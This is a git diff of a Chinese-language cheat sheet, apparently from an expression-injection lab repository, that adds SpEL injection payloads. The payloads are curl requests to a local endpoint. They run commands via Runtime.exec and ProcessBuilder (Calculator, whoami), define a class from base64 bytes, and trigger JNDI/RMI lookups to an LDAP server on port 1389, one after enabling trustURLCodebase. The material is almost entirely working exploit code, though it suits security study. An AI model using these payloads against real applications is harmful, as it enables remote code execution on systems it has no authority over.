@@ -26,12 +26,30 @@ curl 127.0.0.1:8080/ognl/parse -d 'expression=#a%3d(new java.lang.ProcessBuilder
 
 #### spel
 
-```
-# 普通执行
-curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")'
+普通执行
 
-# 读取输出: 用getErrorStream()读取stderr
+```
+curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")'
+```
+
+读取输出: 用getErrorStream()读取stderr
+
+```
 curl 127.0.0.1:8080/spel/parse -d 'expression=new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder("bash", "-c", "whoami").start().getInputStream(), "utf8")).readLine()'
+```
+
+class加载
+
+```
+curl 127.0.0.1:8080/spel/parse -d 'expression=T(org.springframework.cglib.core.ReflectUtils).defineClass("Foo",T(org.springframework.util.Base64Utils).decodeFromString("XXX"),new+javax.management.loading.MLet(new+java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()'
+```
+
+RMI
+
+```
+curl 127.0.0.1:8080/spel/parse -d 'expression=new+javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"),new java.util.Hashtable()).connect()'
+
+curl 127.0.0.1:8080/spel/parse -d 'expression=T(java.lang.System).setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true") %2B new javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"), new java.util.Hashtable()).connect()'
 ```
 
 #### mvel
